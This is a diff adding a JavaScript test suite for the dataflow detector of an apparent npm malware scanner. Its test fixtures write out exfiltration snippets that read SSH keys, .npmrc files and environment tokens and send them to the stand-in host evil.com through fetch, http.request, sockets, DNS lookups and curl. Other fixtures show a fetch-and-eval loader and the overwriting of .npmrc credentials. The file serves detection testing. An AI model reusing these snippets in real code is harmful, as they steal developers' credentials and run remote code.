@@ -1,0 +1,1039 @@
+const fs = require('fs');
+const os = require('os');
+const path = require('path');
+const { test, asyncTest, assert, assertIncludes, runScan, runScanDirect, runScanFast, cleanupTemp, TESTS_DIR } = require('../test-utils');
+
+function makeTempPkg(jsContent, fileName = 'index.js') {
+  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-df-'));
+  fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-pkg', version: '1.0.0' }));
+  fs.writeFileSync(path.join(tmp, fileName), jsContent);
+  return tmp;
+}
+
+async function runDataflowTests() {
+  console.log('\n=== DATAFLOW TESTS ===\n');
+
+  await asyncTest('DATAFLOW: Detects credential read + network send (fast)', async () => {
+    const output = await runScanFast(path.join(TESTS_DIR, 'dataflow'));
+    assertIncludes(output, 'Suspicious flow', 'Should detect suspicious flow');
+  });
+
+  await asyncTest('DATAFLOW: Detects env read + fetch (fast)', async () => {
+    const output = await runScanFast(path.join(TESTS_DIR, 'dataflow'));
+    assertIncludes(output, 'CRITICAL', 'Should be CRITICAL');
+  });
+
+  // --- Dynamic env bracket access ---
+
+  await asyncTest('DATAFLOW: Detects dynamic process.env[variable] as source', async () => {
+    const tmp = makeTempPkg(`const key = 'TOKEN';\nconst val = process.env[key];\nfetch('http://evil.com?d=' + val);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect dynamic env access + network send');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Stream-pipe exfiltration: createReadStream(<sensitive>).pipe(<network sink>) ---
+  // Closes the gap where the SAME exfil scored 89 (readFileSync + socket.write) but only
+  // 9 (sensitive_string) when written as a stream pipe. createReadStream is now a
+  // credential_read source when its path is sensitive; the network sink inside .pipe()
+  // was already detected, so the co-occurrence fires suspicious_dataflow. FP-measured
+  // 0 new flags across 745 benign packages (createReadStream of a sensitive path is
+  // absent from legitimate code; .pipe(res)/.pipe(createWriteStream) are not network sinks).
+
+  await asyncTest('DATAFLOW STREAM-PIPE: createReadStream(.ssh) piped to net.connect → suspicious_dataflow', async () => {
+    const tmp = makeTempPkg(`const fs = require('fs');\nconst net = require('net');\nfs.createReadStream('/home/user/.ssh/id_rsa').pipe(net.connect(1234, 'evil.com'));`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow' && t.message.includes('createReadStream'));
+      assert(t, 'Stream-piped SSH key to a socket must be a suspicious_dataflow');
+      assert(t.severity === 'CRITICAL', `sensitive source + network sink on the same line is CRITICAL, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW STREAM-PIPE: createReadStream(.npmrc) two-step pipe to http.request → suspicious_dataflow', async () => {
+    const tmp = makeTempPkg(`const fs = require('fs');\nconst http = require('http');\nconst { Transform } = require('stream');\nconst x = new Transform({ transform(c, e, cb) { cb(null, c); } });\nfs.createReadStream('.npmrc').pipe(x).pipe(http.request({ hostname: 'evil.com', method: 'POST' }));`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow' && t.message.includes('createReadStream'));
+      assert(t, 'Two-step stream pipe of .npmrc to http.request must be a suspicious_dataflow');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW STREAM-PIPE (neg): createReadStream(non-sensitive).pipe(res) → NOT flagged (static file server)', async () => {
+    // The measured FP landmine (119 benign occurrences): a server streaming a public
+    // file to the HTTP response. Non-sensitive source + response sink → nothing.
+    const tmp = makeTempPkg(`const fs = require('fs');\nconst http = require('http');\nhttp.createServer((req, res) => { fs.createReadStream('public/index.html').pipe(res); }).listen(3000);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(!t, `serving a public file over the response is not exfil, got ${t ? t.message : ''}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW STREAM-PIPE (neg): createReadStream(non-sensitive).pipe(createWriteStream) → NOT flagged (local copy)', async () => {
+    const tmp = makeTempPkg(`const fs = require('fs');\nfs.createReadStream('input.txt').pipe(fs.createWriteStream('output.txt'));`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(!t, `a local file copy is not exfil, got ${t ? t.message : ''}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- .secretKey / .privateKey credential source ---
+
+  await asyncTest('DATAFLOW: Detects .secretKey property as credential source', async () => {
+    const tmp = makeTempPkg(`const sk = wallet.secretKey;\nfetch('http://evil.com', { body: sk });`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow' && t.message.includes('secretKey'));
+      assert(t, 'Should detect .secretKey as credential source');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW: Detects .privateKey property as credential source', async () => {
+    const tmp = makeTempPkg(`const pk = account.privateKey;\nfetch('http://evil.com', { body: pk });`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow' && t.message.includes('privateKey'));
+      assert(t, 'Should detect .privateKey as credential source');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- dns.resolve as sink ---
+
+  await asyncTest('DATAFLOW: Detects dns.resolve as exfiltration sink', async () => {
+    const tmp = makeTempPkg(`const dns = require('dns');\nconst tok = process.env.SECRET_KEY;\ndns.resolve(tok + '.evil.com', () => {});`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow' && t.message.includes('dns'));
+      assert(t, 'Should detect dns.resolve as exfiltration sink');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- http.request as sink ---
+
+  await asyncTest('DATAFLOW: Detects http.request as network sink', async () => {
+    const tmp = makeTempPkg(`const http = require('http');\nconst tok = process.env.NPM_TOKEN;\nhttp.request({ hostname: 'evil.com', path: '/' + tok });`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow' && t.message.includes('http.request'));
+      assert(t, 'Should detect http.request as network sink');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- socket.connect as sink (requires net module import) ---
+
+  await asyncTest('DATAFLOW: Detects socket.connect as sink with net import', async () => {
+    const tmp = makeTempPkg(`const net = require('net');\nconst tok = process.env.AWS_SECRET_KEY;\nconst s = net.connect(80, 'evil.com');`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect socket.connect as network sink');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- writeFileSync to sensitive path (file_tamper) ---
+
+  await asyncTest('DATAFLOW: Detects writeFileSync to .npmrc as credential tampering', async () => {
+    const tmp = makeTempPkg(`const fs = require('fs');\nconst data = process.env.NPM_TOKEN;\nfs.writeFileSync('/home/user/.npmrc', '//registry.npmjs.org/:_authToken=' + data);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'credential_tampering');
+      assert(t, 'Should detect credential tampering via writeFileSync to .npmrc');
+      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- eval() as sink ---
+
+  await asyncTest('DATAFLOW: Detects eval as execution sink', async () => {
+    const tmp = makeTempPkg(`const code = process.env.PAYLOAD;\neval(code);`);
+    try {
+      const result = await runScanDirect(tmp);
+      // eval should be detected as a sink in dataflow
+      const threats = result.threats;
+      const hasEval = threats.some(t => t.type === 'suspicious_dataflow' || t.type === 'dangerous_call_eval');
+      assert(hasEval, 'Should detect eval with env data');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Staged payload: network + eval ---
+
+  await asyncTest('DATAFLOW: Detects staged payload (network fetch + eval)', async () => {
+    const tmp = makeTempPkg(`const http = require('http');\nhttp.get('http://evil.com/payload', (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => eval(d)); });`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'staged_payload');
+      assert(t, 'Should detect staged payload (network + eval)');
+      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Proximity severity ---
+
+  await asyncTest('DATAFLOW: Close source/sink (<50 lines) is CRITICAL', async () => {
+    const code = `const fs = require('fs');\nconst data = fs.readFileSync('/home/user/.ssh/id_rsa', 'utf8');\nfetch('http://evil.com', { body: data });`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect suspicious dataflow');
+      assert(t.severity === 'CRITICAL', 'Close source/sink should be CRITICAL');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW: Distant source/sink (>50 lines) is HIGH', async () => {
+    const lines = [];
+    lines.push(`const fs = require('fs');`);
+    lines.push(`const data = fs.readFileSync('/home/user/.ssh/id_rsa', 'utf8');`);
+    for (let i = 0; i < 60; i++) lines.push(`const x${i} = ${i};`);
+    lines.push(`fetch('http://evil.com', { body: data });`);
+    const tmp = makeTempPkg(lines.join('\n'));
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect suspicious dataflow');
+      assert(t.severity === 'HIGH', 'Distant source/sink should be HIGH');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- os.hostname/userInfo as fingerprint source ---
+
+  await asyncTest('DATAFLOW: Detects os.hostname() + network as fingerprint exfil', async () => {
+    const tmp = makeTempPkg(`const os = require('os');\nconst h = os.hostname();\nfetch('http://evil.com?h=' + h);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow' && t.message.includes('hostname'));
+      assert(t, 'Should detect os.hostname() as fingerprint source');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- fs.readdirSync on sensitive dir ---
+
+  await asyncTest('DATAFLOW: Detects readdirSync on .ssh directory as credential source', async () => {
+    const tmp = makeTempPkg(`const fs = require('fs');\nconst files = fs.readdirSync('/home/user/.ssh');\nfetch('http://evil.com', { body: JSON.stringify(files) });`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect readdirSync on .ssh as credential source');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- containsSensitiveLiteral: BinaryExpression recursion ---
+
+  await asyncTest('DATAFLOW: Detects credential read from concatenated sensitive path', async () => {
+    const tmp = makeTempPkg(`const fs = require('fs');\nconst data = fs.readFileSync('/home/' + '.ssh/id_rsa', 'utf8');\nfetch('http://evil.com', { body: data });`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect credential read from concatenated path');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- isCredentialPath: variable ref ---
+
+  await asyncTest('DATAFLOW: Detects credential read via tracked variable', async () => {
+    const tmp = makeTempPkg(`const fs = require('fs');\nconst sshPath = '/home/user/.ssh/id_rsa';\nconst data = fs.readFileSync(sshPath, 'utf8');\nfetch('http://evil.com', { body: data });`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect credential read via variable tracking');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- exec with curl/wget as sink ---
+
+  await asyncTest('DATAFLOW: Detects execSync with curl as network sink', async () => {
+    const tmp = makeTempPkg(`const { execSync } = require('child_process');\nconst tok = process.env.NPM_TOKEN;\nexecSync('curl http://evil.com -d token');`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect execSync with curl as network sink');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- System identity env vars as fingerprint source ---
+
+  await asyncTest('DATAFLOW: Detects process.env.USER + network send as suspicious_dataflow', async () => {
+    const code = `
+const http = require('http');
+const data = JSON.stringify({ user: process.env.USER, hostname: require('os').hostname() });
+const req = http.request({ hostname: 'evil.com', method: 'POST' });
+req.write(data);
+req.end();
+`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect process.env.USER exfil as suspicious_dataflow');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Intra-file taint tracking tests ---
+
+  await asyncTest('TAINT: Aliased require("os") detected via taint tracking', async () => {
+    const tmp = makeTempPkg(`const myOs = require("os");\nconst h = myOs.homedir();\nfetch("http://evil.com?d=" + h);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect aliased os.homedir() via taint tracking');
+      assert(t.taint_tracked === true, 'Should have taint_tracked flag');
+      assertIncludes(t.message, 'os.homedir', 'Message should include os.homedir');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('TAINT: Destructured child_process exec detected', async () => {
+    const tmp = makeTempPkg(`const { execSync } = require("child_process");\nconst tok = process.env.NPM_TOKEN;\nexecSync("curl http://evil.com -d " + tok);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect destructured execSync with curl as sink');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('TAINT: Chained assignment from aliased os', async () => {
+    const tmp = makeTempPkg(`const myOs = require("os");\nconst h = myOs.homedir();\nconst data = h;\nfetch("http://evil.com?d=" + data);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect chained aliased os.homedir() via taint tracking');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('TAINT: Aliased process.env detected', async () => {
+    const tmp = makeTempPkg(`const env = process.env;\nconst tok = env.NPM_TOKEN;\nfetch("http://evil.com?t=" + tok);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect aliased process.env access');
+      assert(t.taint_tracked === true, 'Should have taint_tracked flag');
+      assertIncludes(t.message, 'NPM_TOKEN', 'Message should include NPM_TOKEN');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('TAINT: Safe module (path) does NOT trigger taint', async () => {
+    const tmp = makeTempPkg(`const p = require("path");\nconst result = p.join("/a", "b");\nconsole.log(result);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(!t, 'Should NOT detect suspicious_dataflow for safe module path');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('TAINT: Aliased fs.readFileSync on sensitive path detected', async () => {
+    const tmp = makeTempPkg(`const myFs = require("fs");\nconst data = myFs.readFileSync("/home/user/.npmrc", "utf8");\nfetch("http://evil.com", { body: data });`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect aliased fs.readFileSync on .npmrc');
+      assert(t.taint_tracked === true, 'Should have taint_tracked flag');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('TAINT: Aliased https sink detected', async () => {
+    const tmp = makeTempPkg(`const h = require("https");\nconst tok = process.env.SECRET_KEY;\nh.request({ hostname: "evil.com", path: "/" + tok });`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect aliased https.request as network sink');
+      assert(t.taint_tracked === true, 'Should have taint_tracked flag');
+      assertIncludes(t.message, 'https.request', 'Message should include https.request');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Exec result exfiltration tests ---
+
+  await asyncTest('EXEC-EXFIL: execSync result → https.request (elf-stats pattern)', async () => {
+    const code = `const { execSync } = require('child_process');
+const https = require('https');
+const output = execSync('cat /opt/*', { encoding: 'utf-8' });
+const postData = JSON.stringify({ output: output });
+const options = { hostname: 'evil.com', method: 'POST' };
+https.request(options).write(postData);`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect execSync result exfiltration');
+      assert(t.taint_tracked === true, 'Should have taint_tracked flag');
+      assertIncludes(t.message, 'child_process.execSync', 'Message should include child_process.execSync');
+      assertIncludes(t.message, 'command output', 'Message should say command output');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('EXEC-EXFIL: exec callback stdout → network send', async () => {
+    const code = `const { exec } = require('child_process');
+const https = require('https');
+exec('whoami', (err, stdout) => {
+  const options = { hostname: 'evil.com', method: 'POST' };
+  const req = https.request(options);
+  req.write(stdout);
+  req.end();
+});`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect exec callback stdout exfiltration');
+      assert(t.taint_tracked === true, 'Should have taint_tracked flag');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('EXEC-EXFIL: execSync result → JSON.stringify → network send', async () => {
+    const code = `const { execSync } = require('child_process');
+const https = require('https');
+const result = execSync('cat /etc/passwd', { encoding: 'utf-8' });
+const data = JSON.stringify({ r: result });
+const req = https.request({ hostname: 'evil.com', method: 'POST' });
+req.write(data);
+req.end();`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect execSync result through JSON.stringify to network');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('EXEC-EXFIL: execSync without network send does NOT trigger', async () => {
+    const code = `const { execSync } = require('child_process');
+const output = execSync('npm install', { encoding: 'utf-8' });
+console.log(output);`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(!t, 'Should NOT detect suspicious_dataflow for exec without network send');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- fs.promises async API detection (Fix 1) ---
+
+  await asyncTest('DATAFLOW: Detects await fs.promises.readFile(.npmrc) + fetch', async () => {
+    const code = `const fs = require('fs');
+async function steal() {
+  const data = await fs.promises.readFile('.npmrc', 'utf8');
+  fetch('http://evil.com', { body: data });
+}`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect fs.promises.readFile on sensitive path + fetch');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW: Detects aliased fs.promises (fsp.readFile) + fetch', async () => {
+    const code = `const fs = require('fs');
+const fsp = fs.promises;
+async function steal() {
+  const data = await fsp.readFile('/home/user/.ssh/id_rsa', 'utf8');
+  fetch('http://evil.com', { body: data });
+}`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect aliased fs.promises.readFile on sensitive path + fetch');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW: Detects require("fs/promises").readFile + fetch', async () => {
+    const code = `const fsp = require('fs/promises');
+async function steal() {
+  const data = await fsp.readFile('.npmrc', 'utf8');
+  fetch('http://evil.com', { body: data });
+}`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect require("fs/promises").readFile on sensitive path + fetch');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW: Detects destructured require("fs/promises") readFile + fetch', async () => {
+    const code = `const { readFile } = require('fs/promises');
+async function steal() {
+  const data = await readFile('.npmrc', 'utf8');
+  fetch('http://evil.com', { body: data });
+}`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect destructured fs/promises readFile on sensitive path + fetch');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW: fs.promises.readFile on non-sensitive path does NOT trigger', async () => {
+    const code = `const fs = require('fs');
+async function loadConfig() {
+  const data = await fs.promises.readFile('package.json', 'utf8');
+  fetch('http://example.com/api', { body: data });
+}`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow' && t.message.includes('fs.promises'));
+      assert(!t, 'Should NOT trigger for fs.promises.readFile on non-sensitive path');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Spread operator taint propagation (Fix 2) ---
+
+  await asyncTest('DATAFLOW: Detects spread operator taint propagation ({...creds} + fetch)', async () => {
+    const code = `const fs = require('fs');
+const creds = fs.readFileSync('/home/user/.npmrc', 'utf8');
+const payload = { ...creds, ts: Date.now() };
+fetch('http://evil.com', { body: JSON.stringify(payload) });`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect taint propagation through spread operator');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW: Spread of non-tainted variable does NOT trigger', async () => {
+    const code = `const config = { url: 'http://example.com', name: 'test' };
+const payload = { ...config, ts: Date.now() };
+fetch('http://example.com/api', { body: JSON.stringify(payload) });`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(!t, 'Should NOT detect suspicious_dataflow for spread of non-tainted variable');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- v2.5.13: Promise .then() callback tainting ---
+
+  await asyncTest('DATAFLOW: fs.promises.readFile(.npmrc).then(data => fetch) detected', async () => {
+    const code = `const fs = require('fs');
+fs.promises.readFile('.npmrc', 'utf8').then(data => {
+  fetch('http://evil.com', { body: data });
+});`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect .then() callback tainted data + network send');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW: fs.promises.readFile(safe).then() does NOT trigger', async () => {
+    const code = `const fs = require('fs');
+fs.promises.readFile('config.json', 'utf8').then(data => {
+  fetch('http://example.com/api', { body: data });
+});`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow' && t.message.includes('fs.promises'));
+      assert(!t, 'Should NOT trigger for .then() on non-sensitive path');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- v2.5.13: fs.readFile callback data tainting ---
+
+  await asyncTest('DATAFLOW: fs.readFile(.npmrc, (err, data) => fetch(data)) detected', async () => {
+    const code = `const fs = require('fs');
+fs.readFile('.npmrc', (err, data) => {
+  fetch('http://evil.com', { body: data });
+});`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect fs.readFile callback data tainted + network send');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW: fs.readFile(safe, callback) does NOT trigger', async () => {
+    const code = `const fs = require('fs');
+fs.readFile('README.md', (err, data) => {
+  fetch('http://example.com', { body: data });
+});`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow' && t.message.includes('readFile'));
+      assert(!t, 'Should NOT trigger for fs.readFile on non-sensitive path');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // =============================================
+  // v2.5.14: B7 — JSON.stringify taint propagation
+  // =============================================
+
+  await asyncTest('DATAFLOW B7: readFileSync + JSON.stringify + fetch — taint preserved', async () => {
+    const code = `const fs = require('fs');
+const d = fs.readFileSync('.npmrc', 'utf8');
+const s = JSON.stringify(d);
+fetch('http://evil.com', { body: s });`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'JSON.stringify should preserve taint from readFileSync(.npmrc)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW B7: JSON.stringify(safe) + fetch — no false positive', async () => {
+    const code = `const safe = { version: '1.0.0' };
+const s = JSON.stringify(safe);
+fetch('http://api.example.com', { body: s });`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(!t, 'JSON.stringify on non-tainted data should NOT trigger suspicious_dataflow');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW B7: x.toString() preserves taint', async () => {
+    const code = `const fs = require('fs');
+const d = fs.readFileSync('.ssh/id_rsa');
+const s = d.toString();
+fetch('http://evil.com', { body: s });`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'toString() should preserve taint');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW B7: String(x) preserves taint', async () => {
+    const code = `const fs = require('fs');
+const d = fs.readFileSync('.env');
+const s = String(d);
+fetch('http://evil.com', { body: s });`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'String() wrapper should preserve taint');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // ==========================================================================
+  // FP-P5 Fix 7: os.hostname() reclassification to telemetry_read
+  // ==========================================================================
+  await asyncTest('FP-P5 Fix7: os.hostname() + fetch does NOT trigger CRITICAL dataflow', async () => {
+    const code = `const os = require('os');
+const h = os.hostname();
+fetch('https://metrics.example.com/report', { body: JSON.stringify({ host: h }) });`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const critFlow = result.threats.find(t =>
+        t.type === 'suspicious_dataflow' && t.severity === 'CRITICAL'
+      );
+      assert(!critFlow, 'os.hostname() + fetch should NOT be CRITICAL (telemetry_read)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('FP-P5 Fix7: os.homedir() + fetch still CRITICAL', async () => {
+    const code = `const os = require('os');
+const h = os.homedir();
+fetch('https://c2.evil.com/exfil', { body: h });`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const critFlow = result.threats.find(t =>
+        t.type === 'suspicious_dataflow' && t.severity === 'CRITICAL'
+      );
+      assert(critFlow, 'os.homedir() + fetch should still be CRITICAL (fingerprint_read)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('FP-P5 Fix7: os.cpus() classified as telemetry_read', async () => {
+    const code = `const os = require('os');
+const c = os.cpus();
+fetch('https://metrics.example.com/report', { body: JSON.stringify({ cpus: c }) });`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const critFlow = result.threats.find(t =>
+        t.type === 'suspicious_dataflow' && t.severity === 'CRITICAL'
+      );
+      assert(!critFlow, 'os.cpus() + fetch should NOT be CRITICAL (telemetry_read)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // ==========================================================================
+  // FP-P6 Fix 4: credential_tampering — cache paths removed
+  // ==========================================================================
+
+  await asyncTest('FP-P6 Fix4: writeFileSync to _cacache triggers credential_tampering (cache poisoning)', async () => {
+    const code = `const fs = require('fs');
+const data = process.env.NPM_TOKEN;
+fs.writeFileSync('/home/user/.cache/_cacache/content', data);`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'credential_tampering');
+      assert(t, 'Write to _cacache should trigger credential_tampering (real cache poisoning vector)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('FP-P6 Fix4: writeFileSync to discord does NOT trigger credential_tampering', async () => {
+    const code = `const fs = require('fs');
+const data = process.env.NPM_TOKEN;
+fs.writeFileSync('/home/user/.config/discord/data.json', data);`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'credential_tampering');
+      assert(!t, 'Write to discord dir should NOT trigger credential_tampering (removed from sensitive paths)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('FP-P6 Fix4: writeFileSync to .npmrc STILL triggers credential_tampering', async () => {
+    const code = `const fs = require('fs');
+const data = process.env.NPM_TOKEN;
+fs.writeFileSync('/home/user/.npmrc', '//registry.npmjs.org/:_authToken=' + data);`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'credential_tampering');
+      assert(t, 'Write to .npmrc should still trigger credential_tampering');
+    } finally { cleanupTemp(tmp); }
